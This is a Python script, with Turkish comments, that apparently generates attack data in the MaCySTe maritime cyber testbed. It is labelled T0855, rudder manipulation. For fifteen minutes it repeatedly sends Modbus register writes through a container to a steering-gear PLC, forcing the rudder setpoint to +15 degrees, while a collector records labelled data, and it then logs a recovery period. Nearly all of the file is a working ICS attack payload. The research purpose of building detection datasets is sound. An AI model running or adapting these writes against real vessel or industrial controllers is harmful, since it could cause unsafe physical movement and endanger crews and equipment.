#!/usr/bin/env python3
"""
T0855 - Rudder Manipulation +15°: host'tan podman exec ile master PLC write
"""
import subprocess, time

DURATION = 900
RECOVERY = 120
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"
CONTAINER = "macyste-openplc-sgs-master-openplc"

def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)

MODBUS_WRITE = """
import struct
from pymodbus.client.sync import ModbusTcpClient
c = ModbusTcpClient('10.1.2.8', port=502)
if c.connect():
    b = struct.pack('<f', 15.0)
    lo = struct.unpack('<H', b[0:2])[0]
    hi = struct.unpack('<H', b[2:4])[0]
    r = c.write_registers(4, [lo, hi], slave=1)
    print('OK' if not r.isError() else 'ERR')
    c.close()
else:
    print('CONN_FAIL')
"""

print("[T0855] Rudder Manipulation +15 derece basliyor (host->container->PLC)...")
collector = run_collector("t0855_rudder_manip", DURATION)
end_time = time.time() + DURATION
count = 0

while time.time() < end_time:
    result = subprocess.run(
        ["podman", "exec", CONTAINER, "python3", "-c", MODBUS_WRITE],
        capture_output=True, text=True, timeout=3
    )
    out = result.stdout.strip()
    if out == "OK":
        count += 1
    elif count % 10 == 0:
        print(f"[ATTACK] {count} write, cikti={out}, kalan={int(end_time-time.time())}s")
    
    if count % 30 == 0 and count > 0:
        print(f"[ATTACK] {count} write, kalan={int(end_time-time.time())}s")
    
    time.sleep(2)

collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print(f"[DONE] {count} Modbus write yapildi")
